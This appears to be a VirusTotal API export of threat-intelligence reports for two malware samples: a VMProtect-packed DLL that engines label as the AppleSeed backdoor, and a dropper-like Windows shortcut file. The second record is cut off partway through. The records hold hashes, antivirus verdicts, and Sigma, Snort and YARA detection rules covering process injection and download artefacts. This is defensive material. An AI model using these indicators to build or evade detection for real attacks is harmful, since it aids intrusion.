[{
  "_id": {
    "$oid": "6596940e92677824626f4447"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 DLL",
      "tlsh": "T12F5623EE228C375CC419C4308033ED19B1B6571E1EE6D9BA75D7FBD027BA865E902B06",
      "vhash": "1660b6050d05050d0507cz1nz2ez4",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "pedll"
      ],
      "creation_date": 1698706888,
      "names": [
        "blGzkW8.rkj8"
      ],
      "last_modification_date": 1704364215,
      "type_tag": "pedll",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 6425088,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.vmprotect/appleseed",
        "popular_threat_category": [
          {
            "count": 24,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 4,
            "value": "vmprotect"
          },
          {
            "count": 2,
            "value": "appleseed"
          },
          {
            "count": 2,
            "value": "qwjdaq"
          }
        ]
      },
      "authentihash": "be0753873ac29f6f6723a59cd804c422289c975db87f8f1acc3e48a825e2ba3a",
      "detectiteasy": {
        "filetype": "PE64",
        "values": [
          {
            "info": "DLL64",
            "version": "14.0",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "3.2.0-3.5.0",
            "type": "Protector",
            "name": "VMProtect"
          }
        ]
      },
      "last_submission_date": 1700290579,
      "sigma_analysis_results": [
        {
          "rule_title": "Bad Opsec Defaults Sacrificial Processes With Improper Arguments",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "CommandLine": "%WINDIR%\\system32\\regsvr32.exe",
                "Image": "C:\\Windows\\system32\\regsvr32.exe"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Detects attackers using tooling with bad opsec defaults.\nE.g. spawning a sacrificial process to inject a capability into the process without taking into account how the process is normally run.\nOne trivial example of this is using rundll32.exe without arguments as a sacrificial process (default in CS, now highlighted by c2lint), running WerFault without arguments (Kraken - credit am0nsec), and other examples.\n",
          "rule_author": "Oleg Kolesnikov @securonix invrep_de, oscd.community, Florian Roth (Nextron Systems), Christian Burkard (Nextron Systems)",
          "rule_id": "53f67594c85a67cef198b525b556658fa4e46d1e49901472adbc8b7f0ba475a8"
        },
        {
          "rule_title": "Suspect Svchost Activity",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "CommandLine": "%WINDIR%\\system32\\svchost.exe",
                "Image": "C:\\Windows\\system32\\svchost.exe"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.",
          "rule_author": "David Burkett, @signalblur",
          "rule_id": "dc04e64e69f5446c2a31920ee22415626307d5f3d0fb73ad81b9d3301a41000a"
        },
        {
          "rule_title": "Regsvr32 DLL Execution With Uncommon Extension",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "CommandLine": "%WINDIR%\\system32\\regsvr32.exe",
                "Image": "C:\\Windows\\system32\\regsvr32.exe"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects a \"regsvr32\" execution where the DLL doesn't contain a common file extension.",
          "rule_author": "Florian Roth (Nextron Systems)",
          "rule_id": "c0cdd12b4805f2aebecbc0415332f2594acf1ae6d8d82da086eeac9a84bf0c37"
        }
      ],
      "meaningful_name": "blGzkW8.rkj8",
      "crowdsourced_ids_stats": {
        "high": 0,
        "info": 0,
        "medium": 1,
        "low": 3
      },
      "trid": [
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 33.6
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 33.1
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 33.1
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 2,
          "medium": 1,
          "critical": 0,
          "low": 0
        }
      },
      "sandbox_verdicts": {
        "Dr.Web vxCube": {
          "category": "malicious",
          "sandbox_name": "Dr.Web vxCube",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "cbdcf6224aa15c70a22346594d1956c0589a9411beb75a003eaccb15db4370a5",
      "type_extension": "dll",
      "tags": [
        "64bits",
        "self-delete",
        "pedll"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "successful-recon-limited",
          "alert_severity": "medium",
          "rule_msg": "PROTOCOL-ICMP Unusual PING detected",
          "rule_raw": "alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"PROTOCOL-ICMP Unusual PING detected\"; icode:0; itype:8; fragbits:!M; content:!\"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI\",depth 32; content:!\"0123456789abcdefghijklmnopqrstuv\",depth 32; content:!\"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\",depth 36; content:!\"WANG2\"; content:!\"cacti-monitoring-system\",depth 65; content:!\"SolarWinds\",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )",
          "rule_references": [
            "https://krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/",
            "https://krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/"
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:29456"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING Windows",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING Windows\"; itype:8; content:\"abcdefghijklmnop\",depth 16; metadata:ruleset community; classtype:misc-activity; sid:382; rev:11; )",
          "rule_id": "1:382"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING\"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )",
          "rule_id": "1:384"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP Echo Reply",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP Echo Reply\"; icode:0; itype:0; metadata:ruleset community; classtype:misc-activity; sid:408; rev:8; )",
          "rule_id": "1:408"
        }
      ],
      "last_analysis_date": 1704356527,
      "unique_sources": 1,
      "first_submission_date": 1700290579,
      "sha1": "5d41e15aba6d89fe99b96e53a3c9d18da7e019a6",
      "ssdeep": "196608:NR52zB++G017hOsyQ3B2eV3u7wBN4l4H:NR5SVvvOsyO2SAwqM",
      "md5": "1f7d2cbfc75d6eb2c4f2b8b7a3eec1bf",
      "pe_info": {
        "exports": [
          "DllInstall",
          "DllRegisterServer",
          "newdsesd",
          "sdahkejsje"
        ],
        "resource_details": [
          {
            "lang": "ENGLISH US",
            "entropy": 4.664633750915527,
            "chi2": 1565.98,
            "filetype": "XML",
            "sha256": "39abce8cd98964b342942a3770e2ce865cda054577ddc4b790ccc0ece897a371",
            "type": "RT_MANIFEST"
          }
        ],
        "resource_types": {
          "RT_MANIFEST": 1
        },
        "imphash": "5c4713180d849694c3a67051a9bebcfd",
        "resource_langs": {
          "ENGLISH US": 1
        },
        "machine_type": 34404,
        "timestamp": 1698706888,
        "entry_point": 9510573,
        "sections": [
          {
            "name": ".text",
            "chi2": -1,
            "virtual_address": 4096,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rx",
            "virtual_size": 194501,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".rdata",
            "chi2": -1,
            "virtual_address": 200704,
            "entropy": 0,
            "raw_size": 0,
            "flags": "r",
            "virtual_size": 45060,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".data",
            "chi2": -1,
            "virtual_address": 249856,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rw",
            "virtual_size": 3284448,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".pdata",
            "chi2": -1,
            "virtual_address": 3534848,
            "entropy": 0,
            "raw_size": 0,
            "flags": "r",
            "virtual_size": 5796,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".00cfg",
            "chi2": -1,
            "virtual_address": 3543040,
            "entropy": 0,
            "raw_size": 0,
            "flags": "r",
            "virtual_size": 56,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".tls",
            "chi2": -1,
            "virtual_address": 3547136,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rw",
            "virtual_size": 9,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": "_RDATA",
            "chi2": -1,
            "virtual_address": 3551232,
            "entropy": 0,
            "raw_size": 0,
            "flags": "r",
            "virtual_size": 348,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".gopes0",
            "chi2": -1,
            "virtual_address": 3555328,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rx",
            "virtual_size": 1485436,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".gopes1",
            "chi2": 951516.38,
            "virtual_address": 5042176,
            "entropy": 7.93,
            "raw_size": 6423040,
            "flags": "rx",
            "virtual_size": 6422540,
            "md5": "cd8cab743c5cf5d6d10c50642f4a5d00"
          },
          {
            "name": ".reloc",
            "chi2": 80104,
            "virtual_address": 11468800,
            "entropy": 1.94,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 196,
            "md5": "066ef07ca6222c796f75321d66064b87"
          },
          {
            "name": ".rsrc",
            "chi2": 65112,
            "virtual_address": 11472896,
            "entropy": 2.35,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 223,
            "md5": "05229346007c23306bcb9b040f377031"
          }
        ],
        "import_list": [
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "CloseHandle",
              "ExitProcess",
              "FreeLibrary",
              "GetModuleFileNameW",
              "GetModuleHandleA",
              "GetProcAddress",
              "GetProcessAffinityMask",
              "LoadLibraryA",
              "LocalAlloc",
              "LocalFree",
              "SetProcessAffinityMask",
              "SetThreadAffinityMask",
              "Sleep"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "GetProcessWindowStation",
              "GetUserObjectInformationW"
            ]
          }
        ]
      },
      "magic": "PE32+ executable (DLL) (GUI) x86-64, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 1,
        "failure": 0,
        "malicious": 42,
        "undetected": 26
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W64.AIDetectMalware",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.VMProtect.4!c",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.GenericKD.70925892",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Generic.mg.1f7d2cbfc75d6eb2",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.Win64.Generic.vc",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Artemis!1F7D2CBFC75D",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.GenericKD.70925892",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Trojan.Win64.Packed.Vhiy",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.134.50627",
          "result": "Trojan ( 0058cdc71 )",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "Packed:Win64/VMProtect.4f9f6c3d",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.134.50628",
          "result": "Trojan ( 0058cdc71 )",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20231026"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Generic.D43A3E44",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.610",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Trojan Horse",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28512",
          "result": "a variant of Win64/Packed.VMProtect.L suspicious",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "APEX": {
          "category": "undetected",
          "engine_name": "APEX",
          "engine_version": "6.485",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan.Win64.Agent.qwjdaq",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.GenericKD.70925892",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win64:MalwareX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-04.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Mal/VMProtBad-A",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Trojan.MulDrop24.18674",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5026",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_FRS.0NA103LR23",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.GenericKD.70925892 (B)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240103-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Webroot": {
          "category": "malicious",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": "W32.Backdoor.Appleseed",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Google": {
          "category": "timeout",
          "engine_name": "Google",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan[Packed]/Win64.VMProtect",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.153.174",
          "result": "Trojan.Heur!.02212022",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36316",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Trojan:Win32/Malgent!MSR",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "Trojan.Win.S.Agent.6425088",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan.Win64.Agent.qwjdaq",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37102B:27.34442",
          "result": "Trojan.GenericKD.70925892",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Backdoor/Win.AppleSeed.R626582",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=82)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/Chgt.AD",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_FRS.0NA103LR23",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.Agent!8.B1E (CLOUD)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": "Static AI - Suspicious PE",
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.300983.susgen",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "PossibleThreat.PALLAS.H",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win64:MalwareX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20240102"
        }
      },
      "reputation": 0,
      "sigma_analysis_stats": {
        "high": 2,
        "medium": 1,
        "critical": 0,
        "low": 0
      }
    },
    "type": "file",
    "id": "cbdcf6224aa15c70a22346594d1956c0589a9411beb75a003eaccb15db4370a5",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/cbdcf6224aa15c70a22346594d1956c0589a9411beb75a003eaccb15db4370a5"
    }
  }
},
{
  "_id": {
    "$oid": "6596a55106bafd61c48fcc55"
  },
  "data": {
    "attributes": {
      "type_description": "Windows shortcut",
      "tlsh": "T190D4DF3095B1BD4ABE5D57B35C141C815ED82FBFC26B81DCCA4160A21EB8231BA6DCB3",
      "vhash": "6d9f1745b06cd970fb6c49270e303d70",
      "type_tags": [
        "windows",
        "lnk"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "Detects JS obfuscation done by the js obfuscator (often malicious)",
          "source": "https://github.com/Neo23x0/signature-base",
          "author": "@imp0rtp3",
          "ruleset_name": "gen_susp_js_obfuscatorio",
          "rule_name": "SUSP_obfuscated_JS_obfuscatorio",
          "ruleset_id": "000e46d4d8"
        },
        {
          "description": "Identifies shortcut (LNK) file larger than 100KB. Most goodware LNK files are smaller than 100KB.",
          "source": "https://github.com/bartblaze/Yara-rules",
          "author": "@bartblaze",
          "ruleset_name": "LNK_Ruleset",
          "rule_name": "Large_filesize_LNK",
          "ruleset_id": "002bb473a9"
        },
        {
          "description": "Identifies executable artefacts in shortcut (LNK) files.",
          "source": "https://github.com/bartblaze/Yara-rules",
          "author": "@bartblaze",
          "ruleset_name": "LNK_Ruleset",
          "rule_name": "EXE_in_LNK",
          "ruleset_id": "002bb473a9"
        },
        {
          "description": "Identifies shortcut (LNK) file with a long relative path. Might be used in an attempt to hide the path.",
          "source": "https://github.com/bartblaze/Yara-rules",
          "author": "@bartblaze",
          "ruleset_name": "LNK_Ruleset",
          "rule_name": "Long_RelativePath_LNK",
          "ruleset_id": "002bb473a9"
        },
        {
          "description": "Identifies archive (compressed) files in shortcut (LNK) files.",
          "source": "https://github.com/bartblaze/Yara-rules",
          "author": "@bartblaze",
          "ruleset_name": "LNK_Ruleset",
          "rule_name": "Archive_in_LNK",
          "ruleset_id": "002bb473a9"
        },
        {
          "description": "Identifies download artefacts in shortcut (LNK) files.",
          "source": "https://github.com/bartblaze/Yara-rules",
          "author": "@bartblaze",
          "ruleset_name": "LNK_Ruleset",
          "rule_name": "Download_in_LNK",
          "ruleset_id": "002bb473a9"
        },
        {
          "description": "Detects a suspiciously big LNK file - maybe with embedded content",
          "source": "https://github.com/Neo23x0/signature-base",
          "author": "Florian Roth (Nextron Systems)",
          "ruleset_name": "gen_susp_lnk",
          "rule_name": "SUSP_LNK_Big_Link_File",
          "ruleset_id": "000bd045c7"
        },
        {
          "description": "Identifies scripting artefacts in shortcut (LNK) files.",
          "source": "https://github.com/bartblaze/Yara-rules",
          "author": "@bartblaze",
          "ruleset_name": "LNK_Ruleset",
          "rule_name": "Script_in_LNK",
          "ruleset_id": "002bb473a9"
        },
        {
          "description": "Detects APT lnk files that run double extraction and launch routines with autoruns",
          "source": "https://github.com/Neo23x0/signature-base",
          "author": "@Grotezinfosec, modified by Florian Roth",
          "ruleset_name": "gen_susp_lnk_files",
          "rule_name": "SUSP_LNK_lnkfileoverRFC",
          "ruleset_id": "00032bfe82"
        },
        {
          "description": "Identifies execution artefacts in shortcut (LNK) files.",
          "source": "https://github.com/bartblaze/Yara-rules",
          "author": "@bartblaze",
          "ruleset_name": "LNK_Ruleset",
          "rule_name": "Execution_in_LNK",
          "ruleset_id": "002bb473a9"
        },
        {
          "description": "Identifies Microsoft Office artefacts in shortcut (LNK) files.",
          "source": "https://github.com/bartblaze/Yara-rules",
          "author": "@bartblaze",
          "ruleset_name": "LNK_Ruleset",
          "rule_name": "MSOffice_in_LNK",
          "ruleset_id": "002bb473a9"
        }
      ],
      "creation_date": 1290309846,
      "names": [],
      "last_modification_date": 1702341808,
      "type_tag": "lnk",
      "times_submitted": 3,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 650178,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.droid/winlnk",
        "popular_threat_category": [
          {
            "count": 23,
            "value": "trojan"
          },
          {
            "count": 5,
            "value": "dropper"
          }
        ],
        "popular_threat_name": [
          {
            "count": 8,
            "value": "droid"
          },
          {
            "count": 3,
            "value": "winlnk"
          }
        ]
      },
      "last_submission_date": 1702327202,
      "sigma_analysis_results": [
        {
          "rule_title": "System File Execution Location Anomaly",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
